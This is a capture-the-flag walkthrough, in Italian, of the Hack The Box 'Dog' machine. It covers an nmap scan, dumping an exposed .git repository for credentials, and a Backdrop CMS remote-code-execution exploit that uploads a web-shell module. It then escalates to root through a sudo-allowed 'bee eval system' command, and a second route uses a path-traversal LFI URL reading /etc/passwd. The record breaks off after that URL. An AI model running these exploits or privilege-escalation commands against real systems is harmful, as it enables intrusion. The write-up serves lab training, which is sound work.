# INtroduzione
ip: 10.10.11.58

### ispirazioni
- https://thecybersecguru.com/ctf-walkthroughs/mastering-dog-beginners-guide-from-hackthebox/
- https://blog.hayneschen.top/CTF/HTB/Dog.html#%E7%AB%8B%E8%B6%B3%E7%82%B9

# Scan and Ennumeration
## NMAP SCAN
> nmap -sV -sC -O 10.10.11.58

> Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 12:52 CET  
> Nmap scan report for 10.10.11.58  
> Host is up (0.47s latency).  
> Not shown: 998 closed tcp ports (reset)  
> PORT   STATE SERVICE VERSION  
> 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)  
> | ssh-hostkey:   
> |   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)  
> |   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)  
> |_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)  
> 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
> |_http-title: Home | Dog  
> | http-git:   
> |   10.10.11.58:80/.git/  
> |     Git repository found!  
> |     Repository description: Unnamed repository; edit this file 'description' to name the...  
> |_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...  
> | http-robots.txt: 22 disallowed entries (15 shown)  
> | /core/ /profiles/ /README.md /web.config /admin   
> | /comment/reply /filter/tips /node/add /search /user/register   
> |_/user/password /user/login /user/logout /?q=admin /?q=comment/reply  
> |_http-server-header: Apache/2.4.41 (Ubuntu)  
> |_http-generator: Backdrop CMS 1 (https://backdropcms.org)  
> Device type: general purpose  
> Running: Linux 4.X|5.X  
> OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
> OS details: Linux 4.15 - 5.19  
> Network Distance: 2 hops  
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
>   
> OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
> Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds

da cui risultano quindi aperte le porte: 22 e 80

mi connetto quindi al sito per fare un po' di enumeration


## Site Enumeration
Del sito risultano accessibili:
- /robots.txt
- /.git/: 
    - da qui possiamo capire che la customizzazione degli alias degli url non è completata (troviamo nei messaggi un todo). 
    - Inoltre potrebbe contenere il codice dell'intera web app


## Vulnerabilità e vettori:
1. backdrop CMS in una vecchia versione
2. .git esposto

<br>
<br>


# Exploitation (strada 1)

1. scaricare la repository git con git-dumper per cercare di ottenere il codice sorgente del sito

2. ispezionare i file chiave del sito web scaricati con git

3. nel file settings si trova la password del Root, mentre nel file update_settings.json si trova l'email dell'admin

    tiffany@dog.htb
    BackDropJ2024DS2024

4. accedo a ?q=admin/dashboard con le credenziali trovate

#### INUTILE
5. modifico i permessi di un account per un accesso più facile

    axel
    axel@dog.htb
    carromano
#### fine inutile

6. su backdrop esiste un modo per fare RCE su backdrop -> https://www.exploit-db.com/exploits/52021

7. creo un trojan utilizzando il file scaricato dall'exploit e lo installo dal sito con manual installation.

    > $python 52021.py http://10.10.11.58
    > Backdrop CMS 1.27.1 - Remote Command Execution Exploit
    > Evil module generating...
    > Evil module generated! shell.zip
    > Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
    > Your shell address: http://10.10.11.58/modules/shell/shell.php

8. accedo alla shell indicata qui sopra e funziona. con cat passwd vedo che esiste l'utente johncusack. accedo con la password che ho trovato prima

9. provo ad accedere in ssh

    ssh johncusack@10.10.11.58
    BackDropJ2024DS2024
    
    funziona.

10. trovo la user flag

11. faccio **sudo -l**

12. vedo che posso usare bee come admin:

13. lo exploito:

    > sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash")'
    
14. sono root, quindi ora posso prendere stampare la flag dalla cartella home di root.


# Exploit (strada 2)

1. scaricare la repository git con git-dumper per cercare di ottenere il codice sorgente del sito

2. ispezionare i file chiave del sito web scaricati con git

3. si può fare LFI tramite una funzione non finita dogsview:
- http://10.10.11.58/?view=dog/../../../../etc/passwd&ext=
    